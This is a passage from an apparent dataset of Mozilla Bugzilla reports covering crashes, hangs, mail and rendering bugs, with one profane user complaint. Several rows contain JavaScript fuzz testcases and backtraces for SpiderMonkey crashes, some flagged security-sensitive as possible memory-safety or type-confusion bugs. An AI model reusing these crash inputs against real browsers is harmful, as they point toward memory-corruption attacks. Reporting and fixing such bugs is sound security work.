+ 12 bytes PL_HandleEvent(PLEvent * 0x02757b00) line 526 + 10 bytes PL_ProcessPendingEvents(PLEventQueue * 0x00d19a80) line 487 + 9 bytes _md_EventReceiverProc(HWND__ * 0x00a205ca, unsigned int 49371, unsigned int 0,  long 13736576) line 975 + 9 bytes USER32! 77e71250() 00d19a80()","""create profile"" crashes 2nd time around"
16167,I go to te sent folder to confirm my message is sent and the fucking messages don't show up.  Geez your fucking mail thing sucks.  it really does.,The goddamn sent folder in the mail window
16267,"From Bugzilla Helper: User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0) BuildID:    2001061122  The style sheet on this page specifies a background image. It works fine on the  Windows version of Mozilla, but not SPARC Solaris.  Reproducible: Always Steps to Reproduce: 1. Go to the page 2. Note the background   Actual Results:  Page lodaed with correct formatting, just no background image.  Expected Results:  It should have displayed the background image.",CSS background not loaded
16352,"I cannot start the latest nightly builds on my PC. They hang during startup with 100% CPU usage. The latest build which is working correctly is 2001051813. In the console the last thing that is written is the registration of the nullplugin. The browser window stays sometimes blank and sometimes some parts of the GUI are displayed. I tried to delete the .mozilla directory to force it to create a new account but it had no effect. Additionally I tried to delete the cache directory, also with no effect. I am running SuSE Linux 7.1 with kernel 2.4.4.",Mozilla hangs during startup with 100% CPU usage
16427,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3) Gecko/20030312 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.3) Gecko/20030312  I have a Multithreaded Visual Fox Pro 8 COM object (dll) that connects to a Microsoft SQL Server 2000 database and pulls customer information and stores it in local variables on the object.  I have an ASP page that creates an instance of the object (Set Session(""tk"") = CreateObject(""Object.class"")) and can then access various information about individual customers.  I then load two instances of Mozilla from the same virutal directory.  In the first one I load customer A, and in the second customer B.  Now that the information is loaded into the COM objects, my pages can display the individual information.  The instance of Mozilla that was loaded last will show the correct information, i.e. customer B; however the instance that was loaded first also shows customer B information.  At first I thought this was a problem with VFP not truely being multithreaded or IIS not allowing the object to be multithreaded.  I tested the procedure in Microsoft Internet Explorer 6.02 and it works as intended.  I was intially using Mozilla 1.2.1 with the same incorrect results as Moziila 1.3  Reproducible: Always  Steps to Reproduce: 1.  Have a COM object that can access multiple records from a dB and store values from a record in its properties (My COM object was written and compiled in VFP 8 as a multithreaded dll and connects to a Microsoft SQL Server 2000 dB) 2.  Create ASP page to create a Session variable that is assigned to the COM object (i.e. Set Session(""myVar"") = CreateObject(""Object.class"")) 3.  Allow the ASP page to access the COM object and load specific records into the COM objects properties (i.e. Session(""myVar"").LoadCustomer(""A"")) 4.  Open two (or more) browsers, connect to the same ASP pages and load two (or more) individual records. 5.  Display the loaded information from the COM object on the ASP page in one broswer (i.e. in ASP <%=Session(""myVar"").CustomerName%>) 6.  Display the loaded information from the COM object in the other brower(s) Actual Results:   The information that was loaded last gets displayed for each instance of the browers.  It acts like the object is not multithreaded, unless you create the object in two seperate virtual directories, then it preforms correctly  Expected Results:   Each browser should display the information that was loaded for it's specific session.  Since I have ruled this out to not being a problem with the dll being multithreaded or IIS, since this example works fine in IE 6.02, I am assuming it is most likley in how Mozilla is creating/referencing the session.  I have not tested this without the COM object since that is what I am currently developing.  Mozilla does not have this problem if I put the pages in two different Virtual directories and point them at the same dB.  Also, if you happen to make a multithreaded dll in VFP becareful with the global variables they are NOT multithreaded, this is a bug in VFP.",Multiple sessions get incorrecte data when opened from the same virtual directory
16560,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040614 Firefox/0.9 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040614 Firefox/0.9  When installing a new version of FF the old version number is still displayed in Add/Remove Programs in the control panel.  This happen for me when I went from Nightlies to RC1 then from RC1 to 0.9  Reproducible: Always Steps to Reproduce: 1.install an old firefox nightly 2.intall the new 0.9 3.look in add/remove programs in you control panel  Actual Results:   Both of the versions show in add/remove programs  Expected Results:   Removed the old version info from add/remove first, then upgraded.  I believe this could cause trouble in the future with Windows XP and if continued could place many firefox's in add/remove",FireFox dosn't remove old version numbers from Add/Remove Programs
16670,"When I was downloading a nightly build of Phoenix and tried to open the preferences dialog in my current build (Milestone 0.2), the browser stopped responding.",Phoenix crashes when opening preferences menu if download dialog is open
16681,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021029 Phoenix/0.4 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021029 Phoenix/0.4  Changing document.images['name'].src does not show the new image! It's very strange, because this works for me in all other browsers (Netscape 7 and Mozilla 1.2b) - but not in Phoenix 0.4.  Reproducible: Always  Steps to Reproduce: 1. Go to http://www.marcoos.zwm.punkt.pl/test/index.html 2. You should see an image with ""linux"" text. The page's backround color is red. 3. Move your mouse over the image.  Actual Results:   The background changes to white (as it should do) but the image does not change to a new one. This applies to local files.  Expected Results:   Phoenix should not only change the background color, but show the new image with ""bsd"" text in it, just as Moz 1.2b (which uses the same gecko as Phoenix 0.4 I think) and Netscape 7 do.    Checked on Phoenix 0.4 with Aqua Jag theme (with the profile I'm usually using) and also with default Phoenix theme on a newly created profile.","document.images['...'].src=""someimage"" does not work (?!)"
16719,"I thought this was so obvious it *had* to be already logged, but have searched on ""print twice"", ""again,"" ""second,"" ""printing twice,"" and so on, with no Bugzilla hits. Since at least 0.9.7, one can only print *once* from Mozilla safely. If one attempts to print a second time, Mozilla immediately crashes.  The bug wherein Mozilla spawns dozens of windows when WordPerfect 10 tries to print may be related; in any event, it would appear something is seriously haywire in the printing process. I have labeled this ""critical"" because crashing upon second print is something which will affect everyone, and will seriously impact the credibility of Mozilla 1.0.","Print twice, second, again crashes M1RC1 Trunk [@ js_Interpret | JS_GetPrivate]"
16723,Tested on 7/6 WinNT and Mac branch builds. 1.) Click on Edit and Preferences. What happens: Nothing.,Preferences cannot be opened.
16726,"To reproduce: 1: Create a message with text in the body (i.e.: ""test"") 2: Save the message to the drafts folder 3: Open the message from the drafts folder (or alternatively move the message into your inbox to verify that the message contains body content, then select and edit message as new)  Expected results: Composition window should contain the old content in the body window.  Actual results: The body window is completely blank.  Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.9+) Gecko/20020311",Dataloss: Drafts / edit message as new brings up composer with blank body
16834,"I set my environment variables: MOZ_OLD_JAR_PACKAGING=1 MOZ_DISABLE_JAR_PACKAGING=1 and rebuilt mozilla. But it still isn't launching.  This is top of the tree from around 6.30pm 9/15/2000.  I get some Assertions: Start reading in bookmarks.html Finished reading in bookmarks.html  (105838 microseconds) *** Failed to load overlay chrome://aim/content/AimGlobalOverlay.xul *** Failed to load overlay chrome://aim/content/AimTaskMenu.xul ###!!! ASSERTION: initial containing block already created: 'nsnull == mInitialContainingBlock', file nsCSSFrameConstructor.cpp, line 8590 ###!!! Break: at file nsCSSFrameConstructor.cpp, line 8590 ###!!! ASSERTION: node in map twice: '(node->mContent != aNode->mContent) || ((node->mContent == nsnull) && (node->mStyle != aNode->mStyle))', file nsFrameManager.cpp, line 2335 ###!!! Break: at file nsFrameManager.cpp, line 2335 ###!!! ASSERTION: node in map twice: '(node->mContent != aNode->mContent) || ((node->mContent == nsnull) && (node->mStyle != aNode->mStyle))', file nsFrameManager.cpp, line 2335 ###!!! Break: at file nsFrameManager.cpp, line 2335 ###!!! ASSERTION: node in map twice: '(node->mContent != aNode->mContent) || ((node->mContent == nsnull) && (node->mStyle != aNode->mStyle))', file nsFrameManager.cpp, line 2335 ###!!! Break: at file nsFrameManager.cpp, line 2335 Warning add child failed!! ###!!! ASSERTION: initial containing block already created: 'nsnull == mInitialContainingBlock', file nsCSSFrameConstructor.cpp, line 8590 ###!!! Break: at file nsCSSFrameConstructor.cpp, line 8590 Warning add child failed!!",Mozilla doesn't launch.
17149,Building the QT port fails because nsIDeviceContextSpecPS::GetPrinter() is not implemented for the concrete QT class.,Recent printing changes break QT port
17184,"seen on windows commercial build 2001-01-30-06-mtrunk  Installer fails to complete with either stub or sea bits Seeing the following ""Error Starting Program"" message:  The UNINSTALL.EXE file is linked to missing export SHELL32.DLL:StrStrlA.",Can't install with stub or sea bits
17281,"for each(w in [0, 0, this]) {     w.y = NaN;     delete w.y;     gc() }  asserts js debug shell on TM tip with -j at Assertion failure: slot < (uint32)dslots[-1], at ../jsobj.h:319  s-s because this involves gc. Assuming [sg:critical?] unless otherwise noted.  autoBisect shows this is probably related to the following changeset:  The first bad revision is: changeset:   42772:fc98415b2fad user:        Brendan Eich date:        Tue Jun 01 19:42:37 2010 -0700 summary:     Trace JSOP_DEL{PROP,ELEM} (523452, r=gal).  ===  (gdb) bt #0  0x0012d422 in __kernel_vsyscall () #1  0x0013c230 in raise (sig=6) at ../nptl/sysdeps/unix/sysv/linux/pt-raise.c:42 #2  0x08166565 in JS_Assert (s=0x8239021 ""slot < (uint32)dslots[-1]"", file=0x8239016 ""../jsobj.h"", ln=319)     at ../jsutil.cpp:80 #3  0x081bae12 in JSObject::getSlotRef (this=0xb7a02000, slot=179) at ../jsobj.h:320 #4  0x081b8a19 in VisitGlobalSlots<js::DetermineTypesVisitor> (visitor=..., cx=0x829ce28, globalObj=0xb7a02000, ngslots=3,      gslots=0x829c0bc) at ../jstracer.cpp:1811 #5  0x081b8307 in VisitSlots<js::DetermineTypesVisitor> (visitor=..., cx=0x829ce28, globalObj=0xb7a02000, callDepth=0,      ngslots=3, gslots=0x829c0bc) at ../jstracer.cpp:1841 #6  0x081b7224 in VisitSlots<js::DetermineTypesVisitor> (visitor=..., cx=0x829ce28, callDepth=0, ngslots=3,      gslots=0x829c0bc) at ../jstracer.cpp:1849 #7  0x0818a9dd in js::TraceRecorder::snapshot (this=0x82a2f40, exitType=js::STATUS_EXIT) at ../jstracer.cpp:4001 #8  0x0818b22a in js::TraceRecorder::guard (this=0x82a2f40, expected=true, cond=0x8270168, exitType=js::STATUS_EXIT)     at ../jstracer.cpp:4208 #9  0x081aa637 in js::TraceRecorder::record_NativeCallComplete (this=0x82a2f40) at ../jstracer.cpp:12911 #10 0x08201908 in js_Interpret (cx=0x829ce28) at ../jsops.cpp:2151 #11 0x080caf28 in js_Execute (cx=0x829ce28, chain=0xb7a02000, script=0x82a4628, down=0x0, flags=0, result=0x0)     at ../jsinterp.cpp:854 #12 0x0806c2cd in JS_ExecuteScript (cx=0x829ce28, obj=0xb7a02000, script=0x82a4628, rval=0x0) at ../jsapi.cpp:4608 #13 0x0804af1d in Process (cx=0x829ce28, obj=0xb7a02000, filename=0xbffff5ca ""/home/netbook150/w15259-reduced.js"",      forceTTY=0) at ../../shell/js.cpp:422 #14 0x0804bc1a in ProcessArgs (cx=0x829ce28, obj=0xb7a02000, argv=0xbffff408, argc=2) at ../../shell/js.cpp:836 #15 0x0805386a in shell (cx=0x829ce28, argc=2, argv=0xbffff408, envp=0xbffff414) at ../../shell/js.cpp:5018 #16 0x08053986 in main (argc=2, argv=0xbffff408, envp=0xbffff414) at ../../shell/js.cpp:5107","TM: ""Assertion failure: slot < (uint32)dslots[-1],"" with delete, gc"
17385,"[Affected versions]:  Nightly 64.0a1 (2018-10-08)  [Affected platforms]: Platforms: Windows 10 x 64, Mac OS 10.13, Ubuntu 16.04.  [Preconditions]: 1. Set the pref dom.payments.request.enabled to ""true""; 2. Make sure you have at least one Shipping Address and one Credit Card saved in your browser.  [Steps to reproduce]: 1. Go to ""https://rsolomakhin.github.io/pr/us/"" and click on ""Buy"" 2. Add or Edit a shipping address 3. Fill in any field with the "" ; "" punctuation mark  4. Click on the ""Pay"" button on the Order Summary screen   [Expected result]: The payment widget should be closed and the response displayed correctly.  [Actual result]: The browser crashes.   [Note]: Tried out all the other basic punctuation marks and symbols on the keyboard, so far only "" ; "" seems to crash the browser.   The crash can NOT be reproduced on Windows 7 x64.","The browser crashes during the payment process if the "" ; ""  punctuation mark is used in fields"
17405,"var out = []; for (let j = 0; j < 5; ++j) { out.push(6 - ((void 0) ^ 0x80000005)); } print(uneval(out));  Assertion failure: (m != JSVAL_INT) || isInt32(*vp), at ../jstracer.cpp:1797  Unlike many arithfuzz assertion bugs, this one requires the script to ""do something"" with the result of the arithmetic expression.","""Assertion failure: (m != JSVAL_INT) || isInt32(*vp)"" with (6 - ((void 0) ^ 0x80000005))"
17436,"Created attachment 8850330 Simulator Screen Shot 23-Mar-2017, 11.18.30 AM.png  Sync sign-in has been unresponsive (on version 8.0(1)) since yesterday (Mar 22, 2017).  1. If you are already logged into Sync, first ""Sign Out"" from Settings. 2. Navigate to Settings -> Sign In to Firefox 3. Enter your email/password and tap ""Sign in"".  **If using this account for the first time on the device:** You'll be sent a confirmation email for validation. So, go ahead and confirm that. You'll notice that the Settings screen on your device recognizes that the confirmation has been done. However, it will not log you into the Sync account. It'll still display the ""Sign In to Firefox"" option in Settings.  **If you have previously used this account on the device:** You'll notice that the spinner keeps spinning forever. You'll also notice that a red bar appears at the top of the page with the text ""Working..."". (See screenshot)  The behavior is the same on the iOS simulator and on an iPhone. However, it works fine for the App Store version (6.1). It's strange given that both use the same URL: https://accounts.firefox.com/signin?service=sync&context=fx_ios_v1  If you try to manually navigate to that URL from your browser's URL bar (desktop or mobile), you'll see the same unresponsive behavior.  I didn't classify the bug under ""Firefox/Sync"" because I'm able to sync from version 6.1 which is using the same URL.",Sync sign-in unresponsive
17477,"RH7.1, 7 hours old optimized CVS build:  crash when opening document in composer  To repro:  start mozilla open composer select File/Recent Pages and then select a file there Crash. Tested this several times - same crash.",Composer crash when opening document with CSS
17512,task: implement stand-alone plaintext editor,[embed] stand-alone plaintext editor
17585,"There has been a design change in the Message Compose interfaces, this effects the design of MAPISendMail and MAPISendDocument implementation. This bug is to track these modifications for trunk landing.  Below is the mail from JF regarding these changes :  Hi Rajiv,  I  checked in this morning some major change that affect the way we manage attachment in message compose. I have replaced the string list we were using in nsIMsgCompFieds by an array of object of type nsIMsgAttachment. Also, I have made some of the APIs obsolete.  Think to not use anymore:  nsIMsgCompFields::GetAttachments nsIMsgCompFields::SetAttachments nsIMsgCompFileds::GetTemporaryFiles nsIMsgCompFileds::SetTemporaryFiles  instead, use the new one:  nsIMsgCompFileds::GetAttachmentsArray nsIMsgCompFileds::AddAttachment nsIMsgCompFileds::RemoveAttachment nsIMsgCompFileds::RemoveAttachments  Also, I made obsolete nsIMsgComposeService::OpenComposeWindowWithValues and nsIMsgComposeService::OpenComposeWindowWithCompFields. If I remember right, you are not using them.  The goal of this change is to allow to specify more information about attachment. Now you can specify the name, the url, if it's a temp file, the content-type, etc... That should allow you to simplify your code.  Let me know if you have any question JFD",Change MAPI SendMail to comply with Message Compose changes
17595,"New behavior perhaps related since bug 822956 landed:  MediaStreamGraph continues to run on the webrtc-landing pages after ""Stop"" is clicked, camera stays on (use ""Video"" button).  This means that video.stop() didn't work on the nsDOMLocalMediaStream. This appears never to end (and shouldn't if stop doesn't work, as we hold a reference to the stream).    Reloading a page with an active MediaStream now takes ~10 seconds to actually stop capture and turn off the camera light.  (Bug 819867 was concerned with this, but when stop is called it isn't a problem).  When this happens, the graph finally stops and dies.  I don't *remember* seeing these problems with earlier versions of the TrackUnion changes (that used nsDOMLocalMediaStreams directly, instead of SourceMediaStreams).   See also Bug 826576 - crashes with null gGraph on shutdown (and in another test that starts/stops mediastreams quickly).  Also ""Stream destroyed twice"" assertions fire when reloading pages with MediaStreams.   Raising to blocker as we may need to temporarily back out part or all of the TrackUnion changes before uplift.",Regressions in MediaStream behavior from TrackUnion changes in bug 822956
17672,if((y for (w in 0)) for each (x in 0)) {for(let z = y in  crashes opt and dbg js shell without -j at RebindLets at null.  autoBisect-ing soon...,Crash [@ RebindLets]
17698,"Created attachment 337512 testcase  See testcase, which normally crashes current trunk build very quickly after loading. It also crashes Firefox 3, but not Firefox 2, it seems. If wanted, I could look for the regression range.  The iframe source consists of this: <?xml-stylesheet href=""chrome://browser/skin/"" type=""text/css""?> <window xmlns=""http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul"" xmlns:html=""http://www.w3.org/1999/xhtml"" xmlns:mathml=""http://www.w3.org/1998/Math/MathML""> <mathml:apply>   <html:iframe/> </mathml:apply> <html:style>window {display: none;}</html:style> <html:marquee/> <wizardpage/>  <script xmlns=""http://www.w3.org/1999/xhtml""> document.documentElement.removeAttributeNode(document.documentElement.attributes[0]); window.addEventListener('DOMAttrModified', function(e) {window.frameElement.parentNode.removeChild(window.frameElement) }, true); </script> </window>","Crash [@ nsStyleContext::Destroy()] with DOMAttrModified removing window, mathml:apply, iframe and window {display: none} style"
17704,"try {     with({         x: (function f(a) {             f(1)         })()     }) {} } catch(e) {} for each(x in ["""", true]) {     for (b = 0; b < 4; ++b) {         if (b % 2 == 0) {             (function () {})()         } {             gc()         }     } }  crashes at js opt shell at a scary address when pasted (0xdb001f12) with -j, at JS_CallTracer near null when passed in as a CLI argument with -j, and asserts at Assertion failure: *flagp != GCF_FINAL, at ../jsgc.cpp:2677 with a js debug shell with -j.  Turning security-sensitive because of scary address and that this concerns gc.  autoBisecting soon...","TM: Crash [@ 0xdb001f12] or [@ JS_CallTracer] or ""Assertion failure: *flagp != GCF_FINAL, at ../jsgc.cpp"""
17723,"The following testcase crashes on mozilla-central revision 20200305-2e1a978b09d7 (build with --enable-debug, run with --fuzzing-safe --no-threads):      Number.prototype.__proto__ = new (TypedObject.uint8.array(5));     var x1 = function Math() {}     this[1] + (x1++);     x1.length;   Backtrace:      received signal SIGSEGV, Segmentation fault.     #0  0x0000555555c4c44e in js::GetPropertyPure(JSContext*, JSObject*, JS::PropertyKey, JS::Value*) ()     #1  0x00005555558ec542 in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) ()     #2  0x00005555558d8323 in Interpret(JSContext*, js::RunState&) ()     [...]     #10 0x000055555576e1f4 in Shell(JSContext*, js::cli::OptionParser*, char**) ()     #11 0x000055555576675e in main ()     rax	0x555556e1fdf1	93825018232305     rbx	0x22b1e000648	2384210167368     rcx	0x555557ef4850	93825035880528     rdx	0x0	0     rsi	0x7ffff6efd770	140737336301424     rdi	0x7ffff6efc540	140737336296768     rbp	0x7fffffffbb10	140737488337680     rsp	0x7fffffffbac0	140737488337600     r8	0x7ffff6efd770	140737336301424     r9	0x7ffff7f9cd00	140737353731328     r10	0x58	88     r11	0x7ffff6ba47a0	140737332791200     r12	0xf538ac26580	16851484697984     r13	0x7fffffffbad0	140737488337616     r14	0x7fffffffbadf	140737488337631     r15	0x7ffff5e27000	140737318645760     rip	0x555555c4c44e <js::GetPropertyPure(JSContext*, JSObject*, JS::PropertyKey, JS::Value*)+286>     => 0x555555c4c44e <_ZN2js15GetPropertyPureEP9JSContextP8JSObjectN2JS11PropertyKeyEPNS4_5ValueE+286>:	movl   $0x201,0x0        0x555555c4c459 <_ZN2js15GetPropertyPureEP9JSContextP8JSObjectN2JS11PropertyKeyEPNS4_5ValueE+297>:	callq  0x5555557ef05e <abort>   Marking s-s because the assertion could indicate a type confusion.","Assertion failure: this->is<T>(), at vm/JSObject.h:513 with TypedObject"
17814,"I compiled from the CVS on Apr  3 on my Red Hat 6.1 box. I left the app running for at least a day. When I tried to close it down, it deadlocked. After attaching to the process with gdb, I was able to generate these stack traces. I hope this helps you track down this thread deadlocking problem.  (gdb) info threads   4 Thread 10486  0x404c01bb in __sigsuspend (set=0xbf5ffba4)     at ../sysdeps/unix/sysv/linux/sigsuspend.c:48 * 3 Thread 10485  0x405497d0 in __poll (fds=0xbf7ffc88, nfds=1, timeout=35000)     at ../sysdeps/unix/sysv/linux/poll.c:45   2 Thread 10481  0x40774f25 in gdk_event_prepare ()   1 Thread 10484  0x405497d0 in __poll (fds=0x81a3b78, nfds=1, timeout=2000)     at ../sysdeps/unix/sysv/linux/poll.c:45  (gdb) thread 4 [Switching to Thread 10486] #0  0x404c01bb in __sigsuspend (set=0xbf5ffba4) at ../sysdeps/unix/sysv/linux/sigsuspend.c:48 ../sysdeps/unix/sysv/linux/sigsuspend.c:48: No such file or directory.  (gdb) bt #0  0x404c01bb in __sigsuspend (set=0xbf5ffba4) at ../sysdeps/unix/sysv/linux/sigsuspend.c:48 #1  0x40261fe0 in pthread_cond_wait (cond=0x81a4074, mutex=0x81920bc) at restart.h:49 #2  0x40240958 in PR_WaitCondVar (cvar=0x81a4070, timeout=4294967295) at ptsynch.c:360 #3  0x40241157 in PR_Wait (mon=0x81920b8, timeout=4294967295) at ptsynch.c:545 #4  0x4019b4e3 in nsThreadPool::GetRequest (this=0x81a3fe8)     at ../../../mozilla/xpcom/threads/nsThread.cpp:409 #5  0x4019c139 in nsThreadPoolRunnable::Run (this=0x81a4088)     at ../../../mozilla/xpcom/threads/nsThread.cpp:604 #6  0x4019a3d7 in nsThread::Main (arg=0x81a40a0) at ../../../mozilla/xpcom/threads/nsThread.cpp:83 #7  0x4024802b in _pt_root (arg=0x81a40c0) at ptthread.c:157 #8  0x40262ce9 in pthread_start_thread (arg=0xbf5ffe7c) at manager.c:204  (gdb) thread 3 [Switching to Thread 10485] #0  0x405497d0 in __poll (fds=0xbf7ffc88, nfds=1, timeout=35000) at ../sysdeps/unix/sysv/linux/poll.c:45 ../sysdeps/unix/sysv/linux/poll.c:45: No such file or directory.  (gdb) bt #0  0x405497d0 in __poll (fds=0xbf7ffc88, nfds=1, timeout=35000) at ../sysdeps/unix/sysv/linux/poll.c:45 #1  0x402463bb in PR_Poll (pds=0x8194f78, npds=1, timeout=35000) at ptio.c:3052 #2  0x40915bf1 in nsSocketTransportService::Run (this=0x8194f38)     at ../../../../mozilla/netwerk/base/src/nsSocketTransportService.cpp:415 #3  0x4019a3d7 in nsThread::Main (arg=0x81952b8) at ../../../mozilla/xpcom/threads/nsThread.cpp:83 #4  0x4024802b in _pt_root (arg=0x81952d8) at ptthread.c:157 #5  0x40262ce9 in pthread_start_thread (arg=0xbf7ffe7c) at manager.c:204   (gdb) thread 2 [Switching to Thread 10481] #0  0x40774f25 in gdk_event_prepare ()  (gdb) bt #0  0x40774f25 in gdk_event_prepare () #1  0x407a2d9a in g_main_iterate () #2  0x407a31e1 in g_main_run () #3  0x406cc7a9 in gtk_main () #4  0x4209c6c7 in nsAppShell::Run (this=0x821e268)     at ../../../../mozilla/widget/src/gtk/nsAppShell.cpp:313 #5  0x418c8af4 in nsAppShellService::Run (this=0x8217e10)     at ../../../../mozilla/xpfe/appshell/src/nsAppShellService.cpp:365 #6  0x804e9e4 in main1 (argc=1, argv=0xbffff554, splashScreen=0x0)     at ../../../mozilla/xpfe/bootstrap/nsAppRunner.cpp:758 #7  0x804efd0 in main (argc=1, argv=0xbffff554) at ../../../mozilla/xpfe/bootstrap/nsAppRunner.cpp:879 #8  0x404b9cb3 in __libc_start_main (main=0x804ecf0 <main>, argc=1, argv=0xbffff554,      init=0x804b950 <_init>, fini=0x8054748 <_fini>, rtld_fini=0x4000a350 <_dl_fini>, stack_end=0xbffff54c)     at ../sysdeps/generic/libc-start.c:78  (gdb) thread 1 [Switching to Thread 10484] #0  0x405497d0 in __poll (fds=0x81a3b78, nfds=1, timeout=2000) at ../sysdeps/unix/sysv/linux/poll.c:45 ../sysdeps/unix/sysv/linux/poll.c:45: No such file or directory.  (gdb) bt #0  0x405497d0 in __poll (fds=0x81a3b78, nfds=1, timeout=2000) at ../sysdeps/unix/sysv/linux/poll.c:45 #1  0x40262a75 in __pthread_manager (arg=0x8) at manager.c:118",mozilla deadlocks on exit
17867,- go to https://secure.rt66.com/guidetohometheater/subnew.html - click ok in the security warning dialog  crash in:  PowerPC unmapped memory exception at 61BA61B8  Unrecognized symbol 'DoF11'  (CurStackBase does not seem to apply...dumping 4K.)   Calling chain using A6/R1 links   Back chain  ISA  Caller   0F9A8900    PPC  16076FAC  _PR_UserRunThread+000C4   0F9A8880    PPC  143C3728  nsThread::Main(void*)+000B0   0F9A8810    PPC  116EAED0  nsSocketTransportService::Run()+00214   0F9A87B0    PPC  116EA4D0  nsSocketTransportService::ProcessWorkQ()+000A4   0F9A8760    PPC  116E1C48  nsSocketTransport::Process(short)+0048C   0F9A86D0    PPC  116E40A4  nsSocketTransport::CloseConnection(int)+00058   0F9A8670    PPC  160724B8  PR_Close+00020   0F9A8630    PPC  111F57E4  nsSSLIOLayerClose(PRFileDesc*)+000AC  Closing log,https site crashes macMozilla
17990,"Trying to open the following file (at least when typed the file URL in the URLbar caused crash for me on NT:  <body onload=""alert('Click some toolbar link (like Home) to crash!')"">Crash test",Crash by alert box in body's onload handler
18026,steps: Navigate tgh Mailnews Prefs. (Sometimes general categories also). You  will it dumps a JS error.  JavaScript error: chrome://global/content/nsWidgetStateManager.js line 128: this.dataManager.pageD ata[aPageTag] has no properties  Platform and build:  Today's commercial build on all platforms.,Navigating tgh MailNews prefs throws JS error.
18027,I've the 2000052420 Mozilla version  In Edit -> Preferences -> Appearance -> Themes  The button Install Theme asks for an URL. If sending any bad URL( note that I  can't test it whith a good because I don't know any) it make Mozilla blocking  and I just can kill the process.  1. Edit -> Preferences -> Appearance -> Themes : [Install Theme ...] 2. Use the URL : http://tout.lemonde.fr,Installing thme from a bad URL crahses Mozilla
18057,"We found a serious bug that make Lotus Domino IMAP server's NAMESPACE feature  unusable.   >         Our hierarchy delimiter is backward slash.  When a folder name > contains forward slash, you treat it as it has subfolder.  From that > point, you can't select the folder and so on.  From the log below, I have > a folder named ""Folder/Iris"".  You can't select that folder because your > client think Iris is a subfolder.  This is a very serious bug against our > server.   > > [0103:0004-00E7] S:  2 OK AUTHENTICATE completed<CRLF> > > [0103:0004-00E7] R:  3 list """" ""%"" > [0103:0004-00E7] S:  * LIST () ""\\"" Drafts<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" Folder/Iris<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" ""Group Calendars""<CRLF> > [0103:0004-00E7] S:  * LIST (\Noinferiors) ""\\"" INBOX<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" Inbox.Peaches<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" ""Sent Items""<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" SentMail<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" SentMail.Broccoli<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" SentMail.Spinach<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" Test<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" Trash<CRLF> > [0103:0004-00E7] S:  * LIST () ""\\"" Untitled<CRLF> > [0103:0004-00E7] S:  3 OK LIST completed<CRLF> > > [0103:0004-00E7] R:  4 list """" ""%\\%"" > [0103:0004-00E7] S:  * LIST () ""\\"" {13}<CRLF> > [0103:0004-00E7] S:  SentMail\sub1<CRLF> > [0103:0004-00E7] S:  4 OK LIST completed<CRLF> > > [0103:0004-00E7] R:  5 list """" ""INBOX"" > [0103:0004-00E7] S:  * LIST (\Noinferiors) ""\\"" INBOX<CRLF> > [0103:0004-00E7] S:  5 OK LIST completed<CRLF> > > [0103:0004-00E7] R:  6 select ""INBOX"" > [0103:0004-00E7] S:  * 13 EXISTS<CRLF> > [0103:0004-00E7] S:  * 0 RECENT<CRLF> > [0103:0004-00E7] S:  * OK [UNSEEN 1] Message 1 is first unseen<CRLF> > [0103:0004-00E7] S:  * OK [UIDVALIDITY 1] UIDs valid<CRLF> > [0103:0004-00E7] S:  * FLAGS (\Flagged \Seen \Answered \Deleted > \Draft)<CRLF> > [0103:0004-00E7] S:  * OK [PERMANENTFLAGS (\Flagged \Seen \Answered > \Deleted \Draft)] Permanent flags<CRLF> > [0103:0004-00E7] S:  6 OK [READ-WRITE] SELECT completed<CRLF> > > [0103:0004-00E7] R:  7 UID fetch 1:* (FLAGS) > [0103:0004-00E7] S:  * 1 FETCH (FLAGS () UID 18)<CRLF> > [0103:0004-00E7] S:  * 2 FETCH (FLAGS () UID 19)<CRLF> > [0103:0004-00E7] S:  * 3 FETCH (FLAGS () UID 20)<CRLF> > [0103:0004-00E7] S:  * 4 FETCH (FLAGS () UID 21)<CRLF> > [0103:0004-00E7] S:  * 5 FETCH (FLAGS () UID 22)<CRLF> > [0103:0004-00E7] S:  * 6 FETCH (FLAGS () UID 23)<CRLF> > [0103:0004-00E7] S:  * 7 FETCH (FLAGS (\Seen) UID 24)<CRLF> > [0103:0004-00E7] S:  * 8 FETCH (FLAGS () UID 25)<CRLF> > [0103:0004-00E7] S:  * 9 FETCH (FLAGS () UID 26)<CRLF> > [0103:0004-00E7] S:  * 10 FETCH (FLAGS (\Seen) UID 27)<CRLF> > [0103:0004-00E7] S:  * 11 FETCH (FLAGS (\Seen) UID 28)<CRLF> > [0103:0004-00E7] S:  * 12 FETCH (FLAGS (\Seen) UID 29)<CRLF> > [0103:0004-00E7] S:  * 13 FETCH (FLAGS (\Seen) UID 30)<CRLF> > [0103:0004-00E7] S:  7 OK FETCH completed<CRLF> > > [0103:0005-0129] S:  1 OK AUTHENTICATE completed<CRLF> > > [0103:0005-0129] R:  2 list """" ""Folder"" > [0103:0005-0129] S:  2 OK LIST completed<CRLF> > > [0103:0005-0129] R:  3 list """" ""Folder\\%\\%"" > [0103:0005-0129] S:  3 OK LIST completed<CRLF> > > [0103:0005-0129] R:  4 select ""Folder\\Iris"" > [0103:0005-0129] S:  4 NO SELECT failure, cannot select mailbox: Mailbox > does not exist<CRLF> > > [0103:0004-00E7] R:  xxxx logout",IMAP backend code does not parse folders using hierarchy delimiter
